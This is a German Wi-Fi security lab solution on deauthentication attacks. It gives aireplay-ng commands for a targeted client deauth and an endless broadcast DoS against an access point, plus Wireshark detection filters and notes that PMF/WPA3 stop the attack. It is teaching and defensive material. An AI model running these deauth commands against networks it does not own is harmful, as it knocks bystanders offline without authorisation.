# Lösung – Übung 06: Deauth & DoS

BSSID `AA:BB:CC:11:22:33`, Client `DE:AD:BE:EF:00:11`, CH 6.

## 1. Gezielte Deauth

```bash
sudo aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 -c DE:AD:BE:EF:00:11 wlan0mon
```
Nur dein Client fliegt kurz raus und reconnectet.

## 2. Broadcast-Deauth (DoS)

```bash
sudo aireplay-ng --deauth 0 -a AA:BB:CC:11:22:33 wlan0mon    # 0 = endlos, Strg+C stoppt
```
`--deauth 0` + kein `-c` = Dauer-DoS gegen **alle** Clients des APs. (Nur eigener AP, kurz!)

## 3. Detection

```bash
# Wireshark-Filter:
wlan.fc.type_subtype == 0x0c      # Deauth
wlan.fc.type_subtype == 0x0a      # Disassoc
```
WIDS erkennt: **ungewöhnlich viele Deauth/Disassoc** in kurzer Zeit, oft mit gefälschter Quell-MAC des APs, Reason-Codes. = klares Angriffs-Signal.

## 4. Mit PMF (802.11w)

AP auf „PMF required" stellen, Client PMF-fähig → erneute Deauth:
```bash
sudo aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 -c DE:AD:BE:EF:00:11 wlan0mon
```
→ **wirkungslos**: die gefälschten (unsignierten) Deauth-Frames werden verworfen, der Client bleibt verbunden.

## 5. Warum möglich / WPA3

Klassische Management-Frames (inkl. Deauth) sind bei WPA2 **nicht geschützt/signiert** → Fälschung trivial. **802.11w (PMF)** signiert sie; **WPA3 erzwingt PMF** → Deauth-DoS entfällt weitgehend.

## Härtung

- **802.11w/PMF aktivieren** (required), **WPA3** nutzen; WIDS/WIPS zur Erkennung/Reaktion.

## Häufige Fehler / Troubleshooting

- **Deauth ohne Wirkung (ohne PMF):** falscher Kanal/zu weit; Kanal mit airodump fixieren.
- **PMF „required" bricht alte Clients:** einige Geräte unterstützen kein PMF → „optional" als Kompromiss (schwächer).
- **Nachbarn gestört:** Umfang/Dauer minimal halten, nur eigener AP.
- **Reason-Code-Filter:** je nach Treiber variiert die gefälschte Quelle.
